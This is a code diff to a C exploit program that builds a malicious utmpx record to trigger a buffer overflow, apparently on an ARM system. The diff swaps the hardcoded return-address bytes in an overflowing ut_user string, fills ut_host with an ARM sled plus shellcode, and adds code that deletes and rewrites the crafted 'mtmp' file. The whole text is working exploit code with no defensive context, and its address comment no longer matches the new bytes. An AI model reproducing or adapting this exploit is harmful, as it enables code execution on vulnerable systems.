@@ -5,6 +5,7 @@
 #include <malloc.h>
 #include <string.h>
 #include <wchar.h>
+#include <unistd.h>
 
 #define UT_COUNT 2
 
@@ -37,7 +38,7 @@ int main(int argc, char **argv) {
 	//Prepare the space...
 	ut->ut_type = USER_PROCESS;
 	memset(ut, 0x61, ut_size);
-	strcpy(ut->ut_user,"AAAAAAAAAAAAAAAAphantom\xa4\x25\x8c\x7eWXYZ"); //0x7e8c25a4
+	strcpy(ut->ut_user,"AAAAAAAAAAAAAAAAphantom\x3c\xf3\xff\x7eWXYZ"); //0x7e8c25a4
   // Build an ARM mode sled...
 	wmemset((wchar_t *)&ut->ut_host, 0xe1a01001, __UT_HOSTSIZE / sizeof(wchar_t));
     memcpy(&ut->ut_host[__UT_HOSTSIZE - sc_size], shellcode, sc_size);
@@ -48,17 +49,29 @@ int main(int argc, char **argv) {
 		printf("%s:x:65535:65535::/tmp:/usr/sbin/nologin\n", ut->ut_user);
 		return -1;
 	}
-	
+
+    if (access("mtmp", F_OK) != -1) {
+        fprintf(stderr, "Found old mtmp, removing it...\n");
+        if (remove("mtmp") != 0) {
+    		fprintf(stderr, "Failed to remove mtmp...\n");
+    		return -1;
+        }
+    }
+
+
+    fprintf(stderr, "Opening new mtmp...\n");
 	fp = fopen("mtmp", "w");
 	if (fp == NULL)	{
 		fprintf(stderr, "Failed to open...\n");
 		return -1;
 	}
 	
+    fprintf(stderr, "Writing mtmp...\n");
 	n = fwrite(ut, sizeof(struct utmpx), UT_COUNT, fp);
 	if (n < UT_COUNT) {
 		fprintf(stderr, "Failed to write expected size... wrote: %d\n", n);
 		return -1;
 	}
 	fclose(fp);
+    return 0;
 }
